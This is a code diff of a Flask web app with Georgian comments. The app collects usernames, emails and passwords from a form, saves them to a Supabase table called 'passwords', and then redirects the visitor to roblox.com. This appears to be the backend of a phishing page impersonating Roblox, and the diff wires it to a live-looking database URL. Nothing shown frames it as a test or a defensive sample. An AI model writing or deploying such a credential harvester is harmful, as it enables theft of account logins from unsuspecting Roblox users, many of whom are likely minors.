@@ -4,9 +4,9 @@ from supabase import create_client, Client
 
 app = Flask(__name__)
 
-# ⚠️ ეს ორი ხაზი მოგვიანებით შეავსე Supabase-დან აღებული მონაცემებით ⚠️
-SUPABASE_URL = "შენი_URL_აქ"
-SUPABASE_KEY = "შენი_KEY_აქ"
+# ⚠️ ეს ორი ხაზი შეავსე Supabase-დან აღებული მონაცემებით ⚠️
+SUPABASE_URL = "https://buqmhyvcxakfkjcgkxbt.supabase.co"
+SUPABASE_KEY = "აქ_ჩასვი_ის_გრძელი_კოდი_sb_publishable_"
 
 # ვუკავშირდებით ბაზას
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
@@ -19,7 +19,7 @@ def index():
         username = request.form.get('username', '')
         email = request.form.get('email', '')
         password = request.form.get('password', '')
-        
+
         # ვწერთ მონაცემებს Supabase-ის ბაზაში
         try:
             supabase.table('passwords').insert({
@@ -31,7 +31,7 @@ def index():
             }).execute()
         except Exception as e:
             print(f"ბაზაში ჩაწერის შეცდომა: {e}")
-        
+
         # მომხმარებელს ისევ რობლოქსზე გადავიყვანთ
         return redirect('https://www.roblox.com')
 
